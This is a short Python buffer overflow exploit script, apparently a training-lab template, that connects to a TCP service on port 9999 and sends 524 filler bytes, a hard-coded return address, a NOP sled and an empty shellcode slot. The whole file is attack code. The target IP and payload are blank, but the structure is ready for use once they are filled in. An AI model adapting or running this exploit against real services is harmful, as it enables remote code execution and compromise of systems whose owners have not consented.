import socket

ip = ""
port = 9999

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xF3\x12\x17\x31"
padding = "\x90" * 32
payload = ("")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")